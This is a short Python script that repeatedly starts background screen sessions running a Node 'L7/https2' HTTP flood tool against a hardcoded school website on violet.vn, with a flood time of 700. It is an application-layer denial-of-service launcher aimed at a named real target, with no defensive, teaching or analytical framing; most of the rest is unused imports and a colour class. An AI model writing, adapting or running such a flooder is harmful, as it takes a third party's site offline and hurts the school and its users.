#!/usr/bin/env python3

from shutil import which
from urllib import parse
from os import system
import subprocess
import random
import os
import sys
import time
import json
import time
try: #pip3 install httpx requests speedtest colorama
	import speedtest
	import colorama
	import requests
	import httpx
except Exception as e:
	sys.exit(e)

stt=1
class Color:
	colorama.init(autoreset=True)
	LB = colorama.Fore.LIGHTBLUE_EX
	LC = colorama.Fore.LIGHTCYAN_EX
	LG = colorama.Fore.LIGHTGREEN_EX
	LR = colorama.Fore.LIGHTRED_EX
	LY = colorama.Fore.LIGHTYELLOW_EX
	RESET = colorama.Fore.RESET
while True :
	url = str("https://thcs-xavuson-langson.violet.vn/")
	floodtime = int("700")
	stt+=1 
	print(stt)
	subprocess.run([f'screen -dm node utils/L7/https2 {url} {floodtime} 1'], shell=True)
